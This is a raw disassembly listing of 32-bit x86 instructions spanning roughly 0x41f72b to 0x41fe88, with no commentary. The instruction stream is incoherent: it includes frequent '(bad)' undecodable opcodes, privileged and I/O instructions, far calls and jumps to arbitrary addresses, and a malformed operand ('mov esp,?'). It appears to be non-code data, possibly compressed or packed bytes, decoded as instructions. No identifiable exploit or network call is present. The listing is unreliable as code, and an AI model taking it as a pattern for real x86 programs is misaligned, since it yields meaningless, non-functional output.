  41f72b:	and    ebp,DWORD PTR [edx+ecx*8+0x543b6ca9]
  41f732:	palignr mm3,mm7,0x9b
  41f737:	jnp    0x41f722
  41f739:	mov    bl,0x3f
  41f73b:	push   ss
  41f73c:	int3   
  41f73d:	xchg   esi,eax
  41f73e:	dec    eax
  41f73f:	ror    BYTE PTR ds:0x5c23f419,1
  41f745:	stos   BYTE PTR es:[edi],al
  41f746:	lock mov ebx,0xfa1530bd
  41f74c:	push   ss
  41f74d:	push   ecx
  41f74e:	add    BYTE PTR fs:[ebp+0x45aaf6e0],dh
  41f755:	push   eax
  41f756:	stc    
  41f757:	not    BYTE PTR [edx+ebp*2-0x72]
  41f75b:	loope  0x41f731
  41f75d:	and    ebx,DWORD PTR [eax-0x7217208]
  41f763:	and    dh,BYTE PTR [ecx]
  41f765:	loop   0x41f702
  41f767:	dec    edx
  41f768:	dec    esi
  41f769:	data16 mov cl,BYTE PTR [edi+ecx*4]
  41f76d:	icebp  
  41f76e:	pop    edx
  41f76f:	frstor [ebp+0x66]
  41f772:	outs   dx,DWORD PTR ds:[esi]
  41f773:	lock adc al,0x3b
  41f776:	cmp    al,0xbc
  41f778:	pop    ebx
  41f779:	das    
  41f77a:	ins    BYTE PTR es:[edi],dx
  41f77b:	(bad)  
  41f77c:	hlt    
  41f77d:	leave  
  41f77e:	mov    al,ds:0x3bdd3d44
  41f783:	sti    
  41f784:	push   0x64845cfb
  41f789:	jb     0x41f751
  41f78b:	call   FWORD PTR [edx]
  41f78d:	mov    ds:0xd65397ea,al
  41f792:	xor    BYTE PTR [ebx-0x7c214943],dl
  41f798:	inc    edi
  41f799:	(bad)
  41f79c:	ffree  st(2)
  41f79e:	push   es
  41f79f:	dec    edx
  41f7a0:	scas   eax,DWORD PTR es:[edi]
  41f7a1:	out    0x26,al
  41f7a3:	mov    DWORD PTR [edx-0x29],0x9bbbeda8
  41f7aa:	sbb    al,0xac
  41f7ac:	ror    ecx,cl
  41f7ae:	push   eax
  41f7af:	or     edx,DWORD PTR [edi-0x61a1e46]
  41f7b5:	xchg   esp,eax
  41f7b6:	imul   edi,DWORD PTR [edx],0x30520a53
  41f7bc:	and    dh,BYTE PTR [eax+eiz*4]
  41f7bf:	ss fs inc ebx
  41f7c2:	sti    
  41f7c3:	clc    
  41f7c4:	mov    ebx,0x9d4ae5ea
  41f7c9:	push   ebx
  41f7ca:	sub    al,0xf7
  41f7cc:	mov    fs,WORD PTR [esi-0x57]
  41f7cf:	mov    cl,0xa0
  41f7d1:	(bad)
  41f7d4:	pop    ecx
  41f7d5:	mov    edi,0xe18c0ee7
  41f7da:	fcom   QWORD PTR [eax]
  41f7dc:	sub    BYTE PTR [ebx],dh
  41f7de:	jge    0x41f780
  41f7e0:	pop    edx
  41f7e1:	push   edi
  41f7e2:	out    dx,al
  41f7e3:	or     al,0xa
  41f7e5:	jge    0x41f79c
  41f7e7:	mov    fs,WORD PTR [eax]
  41f7e9:	sub    BYTE PTR [ecx+ecx*8+0x5d1bf5d4],dl
  41f7f0:	jno    0x41f864
  41f7f2:	mov    WORD PTR [edx-0x376e031a],ds
  41f7f8:	shl    BYTE PTR [ebx+0x68],1
  41f7fb:	hlt    
  41f7fc:	test   dl,0x6a
  41f7ff:	pushf  
  41f800:	dec    edi
  41f801:	jb     0x41f80c
  41f803:	add    cl,al
  41f805:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f806:	jle    0x41f78c
  41f808:	and    DWORD PTR [edx+ebx*8+0x3b],eax
  41f80c:	add    WORD PTR [ebx],bp
  41f80f:	jmp    0xfd57b318
  41f814:	icebp  
  41f815:	xchg   edx,eax
  41f816:	or     eax,DWORD PTR [edi]
  41f818:	mov    al,ds:0xf29ab2fd
  41f81d:	mov    ah,0x9f
  41f81f:	scas   al,BYTE PTR es:[edi]
  41f820:	shl    DWORD PTR [edi],0x6a
  41f823:	mov    edx,0xea5f2691
  41f828:	pushf  
  41f829:	adc    dh,ch
  41f82b:	aad    0xda
  41f82d:	sub    DWORD PTR [esi+edi*8+0x595a0f68],esi
  41f834:	cs push ebp
  41f836:	adc    DWORD PTR [ebx],0x1c89150b
  41f83c:	stc    
  41f83d:	fidiv  WORD PTR [esi-0x80]
  41f840:	jae    0x41f861
  41f842:	js     0x41f882
  41f844:	mov    ch,ah
  41f846:	mov    ebp,0x89a1af94
  41f84b:	int    0xc
  41f84d:	into   
  41f84e:	mov    edi,0xfb5987f8
  41f853:	in     eax,0x3b
  41f855:	pop    esi
  41f856:	call   0x3610cb83
  41f85b:	mov    al,0x5
  41f85d:	lods   eax,DWORD PTR ds:[esi]
  41f85e:	call   0x69d512f7
  41f863:	jl     0x41f890
  41f865:	sahf   
  41f866:	mov    al,ds:0x2160164a
  41f86b:	sbb    eax,0x8f8c124
  41f870:	inc    esp
  41f871:	jns    0x41f81c
  41f873:	sti    
  41f874:	inc    edx
  41f875:	shl    DWORD PTR [edx+0x19],1
  41f878:	and    dl,bl
  41f87a:	in     eax,dx
  41f87b:	ror    DWORD PTR [ecx-0x6b8e5de9],1
  41f881:	leave  
  41f882:	mov    esp,?
  41f884:	mov    cl,0x54
  41f886:	xchg   esp,eax
  41f887:	push   0xf5951cd
  41f88c:	test   eax,0xbdcf4611
  41f891:	dec    esi
  41f892:	test   BYTE PTR [edx-0x26da4f51],0xaa
  41f899:	push   esp
  41f89a:	jecxz  0x41f8ae
  41f89c:	loopne 0x41f893
  41f89e:	inc    eax
  41f89f:	push   cs
  41f8a0:	push   edx
  41f8a1:	rol    DWORD PTR [edi+edi*4-0x3a],cl
  41f8a5:	scas   al,BYTE PTR es:[edi]
  41f8a6:	sbb    bl,0xd0
  41f8a9:	inc    DWORD PTR [edi-0x1df05562]
  41f8af:	ret    0x89c9
  41f8b2:	pop    edx
  41f8b3:	test   bh,dl
  41f8b5:	xor    bl,BYTE PTR [edi]
  41f8b7:	cwde   
  41f8b8:	repnz xor eax,0xc965fcb
  41f8be:	inc    ebx
  41f8bf:	inc    esp
  41f8c0:	add    esp,ebp
  41f8c2:	int    0xb4
  41f8c4:	and    BYTE PTR [edi],bl
  41f8c6:	sub    BYTE PTR [esi-0x437cc19e],al
  41f8cc:	in     al,0xb8
  41f8ce:	inc    ecx
  41f8cf:	xchg   edi,eax
  41f8d0:	setle  BYTE PTR [edx-0x1e4e46cd]
  41f8d7:	test   DWORD PTR [ebp-0x31],0x92f5c39
  41f8de:	scas   eax,DWORD PTR es:[edi]
  41f8df:	enter  0xc842,0x99
  41f8e3:	push   ds
  41f8e4:	ss cs jns 0x41f943
  41f8e8:	jmp    0x41f8b1
  41f8ea:	cmp    ah,BYTE PTR [edx]
  41f8ec:	lea    ebx,[ebp-0x22e76a5f]
  41f8f2:	xor    DWORD PTR [edx],ecx
  41f8f4:	add    dl,BYTE PTR [edx+0x48]
  41f8f7:	rcr    DWORD PTR [edi+ebp*2+0x3e],1
  41f8fb:	inc    eax
  41f8fc:	shl    DWORD PTR [bp+si+0x20cf],1
  41f901:	jle    0x41f910
  41f903:	scas   eax,DWORD PTR es:[edi]
  41f904:	cmp    BYTE PTR [ecx],dh
  41f906:	push   es
  41f907:	int    0xf
  41f909:	jno    0x41f91f
  41f90b:	add    al,0x4c
  41f90d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f90e:	jmp    0xed7858d
  41f913:	jmp    FWORD PTR [ecx+0x20a67167]
  41f919:	loope  0x41f8a8
  41f91b:	cs xchg ecx,eax
  41f91d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f91e:	out    dx,al
  41f91f:	scas   al,BYTE PTR es:[edi]
  41f920:	int3   
  41f921:	mov    edx,DWORD PTR [ebx-0x21]
  41f924:	cmp    al,0x6c
  41f926:	dec    edx
  41f927:	cmp    edi,DWORD PTR [eax]
  41f929:	(bad)  
  41f92b:	fdiv   QWORD PTR [esi-0x69]
  41f92e:	sbb    ah,BYTE PTR [ebx+0x6fece973]
  41f934:	jno    0x41f91e
  41f936:	add    eax,0xa0cc7cd
  41f93b:	call   0x1ce07e9e
  41f940:	sbb    al,0x81
  41f942:	loope  0x41f908
  41f944:	jecxz  0x41f903
  41f946:	jns    0x41f93e
  41f948:	mov    esp,esp
  41f94a:	rcr    DWORD PTR [ebx],1
  41f94c:	push   edi
  41f94d:	push   0x6f
  41f94f:	mov    al,0xc4
  41f951:	repnz sbb ah,BYTE PTR [ebx+0x3e091fa]
  41f958:	(bad)  
  41f959:	sub    edx,DWORD PTR [esi]
  41f95b:	add    BYTE PTR [bx+di-0x741b],cl
  41f960:	pop    ds
  41f961:	jp     0x41f983
  41f963:	mov    dh,0xa0
  41f965:	sub    al,0xff
  41f967:	cmp    DWORD PTR [esi+0x6c],esp
  41f96a:	push   ebx
  41f96b:	or     esp,edx
  41f96d:	adc    DWORD PTR [edi+0x6d65eda8],ebp
  41f973:	or     eax,0x7f09cea9
  41f978:	mov    bl,0xf7
  41f97a:	xor    al,0xd
  41f97c:	pushf  
  41f97d:	xor    ebp,DWORD PTR [eax+0x358079da]
  41f983:	hlt    
  41f984:	popf   
  41f985:	jle    0x41f9f7
  41f987:	adc    eax,0x5522ff68
  41f98c:	call   0x592e:0x75f6f038
  41f993:	jb     0x41f9dc
  41f995:	jle    0x41f9b8
  41f997:	sbb    edx,DWORD PTR [ebp-0x3a]
  41f99a:	dec    edx
  41f99b:	jecxz  0x41fa05
  41f99d:	stos   DWORD PTR es:[edi],eax
  41f99e:	in     eax,0x98
  41f9a0:	xchg   esp,eax
  41f9a1:	push   ss
  41f9a2:	mov    dh,0x69
  41f9a4:	inc    esp
  41f9a5:	call   0x7e67da74
  41f9aa:	shl    esp,0x3f
  41f9ad:	pop    ds
  41f9ae:	adc    DWORD PTR [ebp+0x40],edi
  41f9b1:	lea    esp,[edi+0x1e]
  41f9b4:	cld    
  41f9b5:	je     0x41f957
  41f9b7:	push   esp
  41f9b8:	ja     0x41f95d
  41f9ba:	(bad)  
  41f9bb:	mov    edx,0x25130733
  41f9c0:	nop
  41f9c1:	(bad)  
  41f9c2:	test   edx,0x57f3fa1c
  41f9c8:	rol    BYTE PTR [eax-0x6a15d50d],1
  41f9ce:	adc    esp,ebp
  41f9d0:	jmp    0x41fa26
  41f9d2:	sub    edx,ebp
  41f9d4:	dec    ebx
  41f9d5:	call   0x63dbfd0d
  41f9da:	inc    ecx
  41f9db:	mov    esi,0x28a8148e
  41f9e0:	and    ecx,DWORD PTR [ecx-0x592ce183]
  41f9e6:	fwait
  41f9e7:	xchg   DWORD PTR [esi],esi
  41f9e9:	push   ebp
  41f9ea:	or     BYTE PTR [ecx-0x2cf020f6],bh
  41f9f0:	jne    0x41f9aa
  41f9f2:	pop    ebx
  41f9f3:	stos   DWORD PTR es:[edi],eax
  41f9f4:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41f9f6:	mov    eax,ds:0x31bdf205
  41f9fb:	out    0xec,al
  41f9fd:	cmc    
  41f9fe:	leave  
  41f9ff:	pop    esi
  41fa00:	xchg   ebx,edi
  41fa02:	dec    ecx
  41fa03:	mov    eax,ds:0x3ea2e16b
  41fa08:	pop    ebp
  41fa09:	cmc    
  41fa0a:	outs   dx,BYTE PTR cs:[esi]
  41fa0c:	shr    BYTE PTR [edi-0x70],1
  41fa0f:	sti    
  41fa10:	xor    WORD PTR [ebx+0x11],si
  41fa14:	push   ebp
  41fa15:	iret   
  41fa16:	out    0x38,eax
  41fa18:	cmp    al,0xb5
  41fa1a:	fidivr DWORD PTR [esi+esi*8]
  41fa1d:	pop    ebx
  41fa1e:	sbb    DWORD PTR [ebx-0x17],esi
  41fa21:	sub    ebx,esi
  41fa23:	push   es
  41fa24:	mov    BYTE PTR [ebp-0x70],ah
  41fa27:	xchg   ebp,eax
  41fa28:	inc    edx
  41fa29:	adc    dl,BYTE PTR [esi]
  41fa2b:	pop    ds
  41fa2c:	iret   
  41fa2d:	in     al,dx
  41fa2e:	pop    esp
  41fa2f:	mov    dl,0x61
  41fa31:	xor    BYTE PTR [esi+0x4a8f43f5],dl
  41fa37:	mov    edi,0x48d1a8d3
  41fa3c:	adc    DWORD PTR [eax+0x73],edi
  41fa3f:	dec    eax
  41fa40:	or     BYTE PTR [esi+0x51d3f4fb],al
  41fa46:	in     al,0xb9
  41fa48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa49:	adc    BYTE PTR [ebx+0x34],bl
  41fa4c:	push   edx
  41fa4d:	cmp    eax,0x50db65a6
  41fa52:	(bad)  
  41fa53:	sbb    DWORD PTR [eax-0x44],eax
  41fa56:	push   ebx
  41fa57:	or     BYTE PTR [esi-0x7f],0x77
  41fa5b:	cmp    ch,BYTE PTR [edi-0x14]
  41fa5e:	pop    ds
  41fa5f:	scas   al,BYTE PTR es:[edi]
  41fa60:	dec    eax
  41fa61:	xchg   edx,eax
  41fa62:	mov    bl,0x7d
  41fa64:	push   ecx
  41fa65:	ins    BYTE PTR es:[edi],dx
  41fa66:	jbe    0x41faa8
  41fa68:	push   cs
  41fa69:	test   BYTE PTR [eax],dh
  41fa6b:	cld    
  41fa6c:	out    dx,eax
  41fa6d:	dec    eax
  41fa6e:	add    dl,BYTE PTR [eax]
  41fa70:	aaa    
  41fa71:	inc    ecx
  41fa72:	inc    ebx
  41fa73:	mov    bh,0x2b
  41fa75:	(bad)  
  41fa76:	xor    bh,BYTE PTR [edi-0x74ab5032]
  41fa7c:	mov    cs,WORD PTR [eax+0x55]
  41fa7f:	mov    ebx,0x7d0e642b
  41fa84:	aaa    
  41fa85:	leave  
  41fa86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa87:	pop    ecx
  41fa88:	fisub  DWORD PTR [ecx+0x60c6bc29]
  41fa8e:	cmp    DWORD PTR [edx+0x62],edx
  41fa91:	add    esp,esp
  41fa93:	call   0x66c23349
  41fa98:	mov    ebp,0x21247681
  41fa9d:	dec    esi
  41fa9e:	xchg   ebx,eax
  41fa9f:	jno    0x41fa6d
  41faa1:	jo     0x41fa7c
  41faa3:	xor    eax,0x72ff67fc
  41faa8:	ins    DWORD PTR es:[edi],dx
  41faa9:	add    ah,ch
  41faab:	xlat   BYTE PTR ds:[ebx]
  41faac:	ins    BYTE PTR es:[edi],dx
  41faad:	fcmovne st,st(0)
  41faaf:	sbb    al,0x9e
  41fab1:	mov    bh,0x8b
  41fab3:	jmp    0x41fae0
  41fab5:	cli    
  41fab6:	mov    ch,0x1d
  41fab8:	push   ds
  41fab9:	mov    dh,0xf8
  41fabb:	ret    
  41fabc:	cwde   
  41fabd:	clc    
  41fabe:	inc    eax
  41fabf:	xchg   ebp,eax
  41fac0:	sub    BYTE PTR [ecx],dh
  41fac2:	or     ecx,0xffffff89
  41fac5:	test   BYTE PTR [ebx],dl
  41fac7:	or     ch,dl
  41fac9:	imul   ecx,DWORD PTR gs:[esi+eiz*2+0x529cd579],0x6fcf6c20
  41fad5:	in     eax,0x2
  41fad7:	mov    bh,0x48
  41fad9:	(bad)
  41fadc:	fcom   QWORD PTR [esi-0x61bef14e]
  41fae2:	inc    esp
  41fae3:	clc    
  41fae4:	xchg   esi,eax
  41fae5:	rol    BYTE PTR [ecx+0x4f],0x7b
  41fae9:	or     ebp,ebx
  41faeb:	jb     0x41fa96
  41faed:	xchg   ebp,eax
  41faee:	test   BYTE PTR [edi-0x26],bl
  41faf1:	outs   dx,BYTE PTR ds:[esi]
  41faf2:	mov    ah,0x9a
  41faf4:	outs   dx,BYTE PTR ds:[esi]
  41faf5:	dec    edx
  41faf6:	arpl   WORD PTR cs:[ebx-0x500a766c],bx
  41fafd:	mov    ecx,0xc7129cf
  41fb02:	ror    ebp,1
  41fb04:	xchg   DWORD PTR [ebp+0x7b],eax
  41fb07:	enter  0x46d4,0x93
  41fb0b:	jge    0x41faf1
  41fb0d:	cmc    
  41fb0e:	add    al,0x74
  41fb10:	adc    BYTE PTR [ebx],al
  41fb12:	push   esp
  41fb13:	sbb    DWORD PTR [edx],ebx
  41fb15:	shl    BYTE PTR [ebx+0x24ced550],1
  41fb1b:	hlt    
  41fb1c:	rcl    DWORD PTR [eax-0x31225a5c],0x39
  41fb23:	loopne 0x41fb2a
  41fb25:	(bad)  
  41fb26:	imul   DWORD PTR [esi]
  41fb28:	(bad)  
  41fb2a:	pop    es
  41fb2b:	(bad)  
  41fb2c:	int    0xae
  41fb2e:	mov    cl,0xd8
  41fb30:	enter  0x194a,0xd0
  41fb34:	cmc    
  41fb35:	arpl   WORD PTR [ebx-0x7a028b8a],bp
  41fb3b:	cmc    
  41fb3c:	push   0xe596db1d
  41fb41:	popf   
  41fb42:	dec    edi
  41fb44:	adc    BYTE PTR [edx+ebp*1-0x1ddf5a2b],ah
  41fb4b:	(bad)  
  41fb4c:	cli    
  41fb4d:	sub    BYTE PTR [ebp-0x274d84a7],bh
  41fb53:	outs   dx,BYTE PTR ds:[esi]
  41fb54:	cld    
  41fb55:	mov    bh,0x6e
  41fb57:	and    esi,DWORD PTR [ebp-0x16]
  41fb5a:	mov    al,0xe
  41fb5c:	jmp    0xf315a424
  41fb61:	fnstcw WORD PTR [eax-0x45]
  41fb64:	lea    esp,[esi]
  41fb66:	clc    
  41fb67:	push   eax
  41fb68:	js     0x41fb94
  41fb6a:	(bad)  
  41fb6b:	jmp    0x41fb02
  41fb6d:	push   ebx
  41fb6e:	mov    ds:0xb7eb1894,eax
  41fb73:	enter  0x643a,0x79
  41fb77:	xchg   ebp,eax
  41fb78:	push   ecx
  41fb79:	push   0x73cfca8e
  41fb7e:	pop    ds
  41fb7f:	dec    esi
  41fb80:	push   ecx
  41fb81:	sub    bh,dl
  41fb83:	mov    ds:0x76ef9ed6,eax
  41fb88:	verr   ax
  41fb8b:	sub    BYTE PTR [ecx+0x14],bl
  41fb8e:	repnz and eax,0xd92e02bd
  41fb94:	xchg   esi,eax
  41fb95:	adc    eax,0x6bc02411
  41fb9a:	loope  0x41fbbc
  41fb9c:	xor    dh,BYTE PTR [edi+0x4199719a]
  41fba2:	mov    al,ds:0xf67aecf5
  41fba7:	ja     0x41fbdf
  41fba9:	lds    eax,FWORD PTR [ebp-0x58]
  41fbac:	sbb    eax,0xe3475258
  41fbb1:	ins    DWORD PTR es:[edi],dx
  41fbb2:	dec    edx
  41fbb3:	mov    dl,0xfa
  41fbb5:	call   0xab7a:0x5670adfd
  41fbbc:	int    0xaa
  41fbbe:	sub    BYTE PTR [eax],cl
  41fbc0:	push   eax
  41fbc1:	into   
  41fbc2:	jmp    0x41fb46
  41fbc4:	or     edx,ebp
  41fbc6:	fstp   DWORD PTR ds:0xfd2dcc9
  41fbcc:	sub    DWORD PTR [ebx+esi*4],0x2c3e9b47
  41fbd3:	push   0x5f
  41fbd5:	jp     0x41fbd5
  41fbd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbd8:	lea    eax,[edx+eiz*8]
  41fbdb:	mov    eax,0xb4c06034
  41fbe0:	adc    DWORD PTR [edx-0x7b],edx
  41fbe3:	add    ebx,DWORD PTR [esi+0x54ff7a7b]
  41fbe9:	dec    edi
  41fbea:	push   ecx
  41fbeb:	pop    ebp
  41fbec:	pop    esp
  41fbed:	fs sub dl,BYTE PTR ss:[edx+0x2e]
  41fbf2:	mov    ebp,edi
  41fbf4:	or     ch,dh
  41fbf6:	(bad)  
  41fbf7:	je     0x41fb81
  41fbf9:	call   0xbb2d3d84
  41fbfe:	xchg   edi,eax
  41fbff:	enter  0x2b5d,0xce
  41fc03:	clc    
  41fc04:	test   al,0x27
  41fc06:	mov    bh,0xb
  41fc08:	imul   esi,DWORD PTR [edi+0x66],0xfffffffc
  41fc0c:	mov    ebx,0xc61de538
  41fc11:	inc    edi
  41fc12:	add    DWORD PTR [esi+0x8b1062],eax
  41fc18:	or     dl,ah
  41fc1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc1b:	fisttp QWORD PTR [eax+0x6dc756e9]
  41fc21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc22:	jmp    0x41fc47
  41fc24:	jecxz  0x41fbbe
  41fc26:	cdq    
  41fc27:	mov    ebx,0x34ff7574
  41fc2c:	pop    edx
  41fc2d:	rol    edx,1
  41fc2f:	push   ss
  41fc30:	rcl    DWORD PTR [eax+ecx*8-0x5c92e5ee],1
  41fc37:	mov    al,ds:0xadfef561
  41fc3c:	mov    al,0x57
  41fc3e:	add    eax,0x457e2cf5
  41fc43:	in     al,0xb6
  41fc45:	push   edx
  41fc46:	nop
  41fc47:	in     eax,0x3f
  41fc49:	jb     0x41fcb7
  41fc4b:	clc    
  41fc4c:	pusha  
  41fc4d:	stos   DWORD PTR es:[edi],eax
  41fc4e:	xchg   ecx,eax
  41fc4f:	rcr    DWORD PTR [edx],cl
  41fc51:	or     al,0x96
  41fc53:	ficomp DWORD PTR [eax]
  41fc55:	mov    ch,BYTE PTR [ebx]
  41fc57:	push   edi
  41fc58:	fimul  WORD PTR [edi-0x5c]
  41fc5b:	imul   BYTE PTR [edx]
  41fc5d:	jle    0x41fbec
  41fc5f:	out    0x56,al
  41fc61:	clc    
  41fc62:	and    al,0xa2
  41fc64:	(bad)  [edx-0x6e8591ac]
  41fc6a:	xchg   BYTE PTR [edx+edx*4],cl
  41fc6d:	xor    DWORD PTR ds:[eax+edx*1-0x70],esi
  41fc72:	mov    eax,ds:0xc9f27c5f
  41fc77:	mov    esp,0x7b3cc9c3
  41fc7c:	sbb    esp,0x2dfe941b
  41fc82:	dec    eax
  41fc83:	and    DWORD PTR [ebx+0x7a4ffcea],0x7acd8376
  41fc8d:	retf   0xf25d
  41fc90:	dec    eax
  41fc91:	dec    esp
  41fc92:	inc    esp
  41fc93:	sbb    esp,0x9a709bfd
  41fc99:	pop    ebx
  41fc9a:	hlt    
  41fc9b:	dec    ebx
  41fc9c:	jnp    0x41fcb7
  41fc9e:	and    al,0x81
  41fca0:	xchg   edi,eax
  41fca1:	repz sar BYTE PTR [esi+ebp*1+0x59],0xf4
  41fca7:	push   ecx
  41fca8:	jmp    0x41fcd3
  41fcaa:	inc    esi
  41fcab:	jnp    0x41fc47
  41fcad:	dec    ebp
  41fcae:	and    edi,0x1c
  41fcb1:	push   eax
  41fcb2:	xor    eax,0xfe1a807f
  41fcb7:	stos   BYTE PTR es:[edi],al
  41fcb8:	(bad)  
  41fcb9:	or     edx,esp
  41fcbb:	xor    DWORD PTR [ebp-0x7c],0x22
  41fcbf:	loope  0x41fc5d
  41fcc1:	cs cli 
  41fcc3:	mov    DWORD PTR gs:[esi+0x6605afa0],0x874a1574
  41fcce:	mov    ecx,0x5e6d7dd3
  41fcd3:	or     eax,0xb938944c
  41fcd8:	(bad)  
  41fcd9:	imul   ebp,DWORD PTR [ecx-0x6e],0x25
  41fcdd:	add    ecx,DWORD PTR [ebp+0x71]
  41fce0:	loope  0x41fd09
  41fce2:	ss add al,0xf3
  41fce5:	mov    ch,0x5a
  41fce7:	lahf   
  41fce8:	out    dx,eax
  41fce9:	div    BYTE PTR [ebx]
  41fceb:	int    0x8f
  41fced:	(bad)  
  41fcee:	int    0x6a
  41fcf0:	retf   
  41fcf1:	push   edx
  41fcf2:	ja     0x41fcc0
  41fcf4:	aad    0xe8
  41fcf6:	inc    edx
  41fcf7:	dec    ebp
  41fcf8:	repnz rol BYTE PTR [ebx+0x73],0xa0
  41fcfd:	cwde   
  41fcfe:	(bad)  
  41fcff:	xchg   ebx,eax
  41fd00:	hlt    
  41fd01:	in     al,dx
  41fd02:	loop   0x41fd3b
  41fd04:	repnz sti 
  41fd06:	les    ecx,FWORD PTR [bp+si+0x32d2]
  41fd0b:	xchg   esp,eax
  41fd0c:	xchg   ebx,eax
  41fd0d:	stos   DWORD PTR es:[edi],eax
  41fd0e:	pop    ss
  41fd0f:	aaa    
  41fd10:	ret    0x2a0a
  41fd13:	jg     0x41fcae
  41fd15:	mov    al,ds:0x5ba15ef0
  41fd1a:	test   eax,0x8b1d247b
  41fd1f:	pop    ds
  41fd20:	cs mov al,0x54
  41fd23:	push   ss
  41fd24:	cli    
  41fd25:	xchg   BYTE PTR [esi+0x61201619],dh
  41fd2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd2c:	sub    dl,BYTE PTR [edi]
  41fd2e:	xchg   DWORD PTR [ecx-0xa],esi
  41fd31:	push   cs
  41fd32:	(bad)  [ebx+0x615e7cc6]
  41fd38:	dec    ebp
  41fd39:	jno    0x41fd6d
  41fd3b:	enter  0x2243,0xc2
  41fd3f:	sub    DWORD PTR ds:0x5e9d62e5,0x6901ec0a
  41fd49:	dec    ebp
  41fd4a:	jbe    0x41fd15
  41fd4c:	mov    BYTE PTR [esi],dh
  41fd4e:	and    al,0x1f
  41fd50:	aas    
  41fd51:	sbb    BYTE PTR [esi+0x4c53064c],0xb7
  41fd58:	sbb    BYTE PTR [edx+0x271f2031],0x32
  41fd5f:	mov    ecx,0xdc9ddaf3
  41fd64:	inc    esi
  41fd65:	shl    DWORD PTR [ebx+eax*1],0x95
  41fd69:	imul   ecx,DWORD PTR [esi],0x977e77b
  41fd6f:	sar    BYTE PTR [ebx],1
  41fd71:	test   al,0x99
  41fd73:	fwait
  41fd74:	test   DWORD PTR [esi],ebx
  41fd76:	pop    ebp
  41fd77:	sti    
  41fd78:	or     eax,DWORD PTR gs:[ebp+0xc]
  41fd7c:	and    cl,ah
  41fd7e:	inc    edi
  41fd7f:	inc    esp
  41fd80:	fst    DWORD PTR [ecx]
  41fd82:	jle    0x41fd15
  41fd84:	(bad)  
  41fd85:	dec    ecx
  41fd86:	bswap  ecx
  41fd88:	sub    al,0x61
  41fd8a:	ins    BYTE PTR es:[edi],dx
  41fd8b:	jae    0x41fdf1
  41fd8d:	out    dx,al
  41fd8e:	add    BYTE PTR [ebx+ecx*2+0x2c6823b9],cl
  41fd95:	adc    al,0xb7
  41fd97:	ret    0x16cf
  41fd9a:	push   ebx
  41fd9b:	(bad)  
  41fd9c:	xor    eax,0x1126d8ea
  41fda1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fda2:	mov    dl,0x62
  41fda4:	scas   al,BYTE PTR es:[edi]
  41fda5:	js     0x41fd33
  41fda7:	xor    ebx,DWORD PTR [edx+0x46]
  41fdaa:	out    0xe5,al
  41fdac:	or     DWORD PTR [ecx-0x6503d04a],ecx
  41fdb2:	jge    0x41fd56
  41fdb4:	mov    al,0x49
  41fdb6:	scas   eax,DWORD PTR es:[edi]
  41fdb7:	and    eax,0x1662590e
  41fdbc:	sbb    al,0x72
  41fdbe:	test   eax,0x17237503
  41fdc3:	push   esp
  41fdc4:	neg    esp
  41fdc6:	call   FWORD PTR [edi+eiz*2-0x16]
  41fdca:	push   ds
  41fdcb:	or     ah,BYTE PTR ss:[edx]
  41fdce:	xor    ch,dh
  41fdd0:	arpl   di,cx
  41fdd2:	push   ebx
  41fdd3:	and    DWORD PTR [ebx-0x5b],esi
  41fdd6:	in     al,dx
  41fdd7:	jmp    0x9b885079
  41fddc:	fadd   QWORD PTR [edi+0x45]
  41fddf:	sti    
  41fde0:	aam    0x5f
  41fde2:	test   eax,0x7bc58486
  41fde7:	lds    eax,FWORD PTR [ecx+0x1c]
  41fdea:	xor    al,0xbf
  41fdec:	xor    BYTE PTR [ebx+0x22ee0200],dh
  41fdf2:	ficom  DWORD PTR cs:[esp+ebx*8]
  41fdf6:	aaa    
  41fdf7:	xor    BYTE PTR [ecx+ecx*2+0xb62dc48],bh
  41fdfe:	in     al,dx
  41fdff:	mov    ebx,0x49fa94cb
  41fe04:	loop   0x41fe5d
  41fe06:	aam    0x86
  41fe08:	and    al,0x59
  41fe0a:	mov    ds:0x650f4c4b,al
  41fe0f:	inc    ebp
  41fe10:	into   
  41fe11:	hlt    
  41fe12:	or     DWORD PTR [esi+eax*4],eax
  41fe15:	mov    WORD PTR [edi+0x7a831a09],cs
  41fe1b:	sub    eax,0x5595e40d
  41fe20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe21:	aas    
  41fe22:	inc    edx
  41fe23:	jg     0x41fe1d
  41fe25:	(bad)  
  41fe26:	mov    cl,0x7e
  41fe28:	arpl   WORD PTR [ecx+0x71],bx
  41fe2b:	mov    ecx,0x296bd44c
  41fe30:	out    dx,al
  41fe31:	inc    ecx
  41fe32:	call   0x63a0:0xfa79f7b4
  41fe39:	add    dh,BYTE PTR [edi+0x27]
  41fe3c:	outs   dx,DWORD PTR ds:[esi]
  41fe3d:	scas   al,BYTE PTR es:[edi]
  41fe3e:	mov    dl,0xd5
  41fe40:	cmp    al,0x79
  41fe42:	and    DWORD PTR [ebp-0x1390abe7],ebx
  41fe48:	push   ebp
  41fe49:	xchg   BYTE PTR [edx+0xc],dh
  41fe4c:	cmp    eax,0x498e9732
  41fe51:	scas   eax,DWORD PTR es:[edi]
  41fe52:	fdivr  QWORD PTR [ebx-0x58]
  41fe55:	mov    eax,0x539e9a95
  41fe5a:	and    DWORD PTR [esi-0x17],ecx
  41fe5d:	or     BYTE PTR [ecx+0x5a862d2e],al
  41fe63:	clc    
  41fe64:	dec    edx
  41fe65:	pop    ecx
  41fe66:	scas   al,BYTE PTR es:[edi]
  41fe67:	mov    al,0x20
  41fe69:	in     eax,0x47
  41fe6b:	arpl   WORD PTR [ebx],si
  41fe6d:	jle    0x41fed2
  41fe6f:	pop    ecx
  41fe70:	mov    ebp,0x5319f047
  41fe75:	fmul   QWORD PTR [edx]
  41fe77:	pushf  
  41fe78:	mov    edx,0x848ddef0
  41fe7d:	ret    0x461e
  41fe80:	mov    bl,0xae
  41fe82:	sbb    eax,0x98c2d479
  41fe87:	dec    edx
  41fe88:	data16 cmp cl,dh
